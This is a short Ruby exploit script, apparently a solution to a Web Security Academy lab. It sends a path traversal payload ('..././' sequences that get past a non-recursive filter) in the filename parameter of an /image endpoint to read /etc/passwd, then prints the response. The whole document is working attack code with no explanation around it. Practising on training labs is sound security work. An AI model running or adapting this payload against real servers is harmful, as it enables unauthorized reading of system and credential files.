require 'http'

url='https://0a82000c0360fe5b814e39e8002d0004.web-security-academy.net'

path='/image'

payload = '..././..././..././..././..././etc/passwd'

client = HTTP.get(url+path,:params => {:filename=>"#{payload}"})

puts client.body.to_s
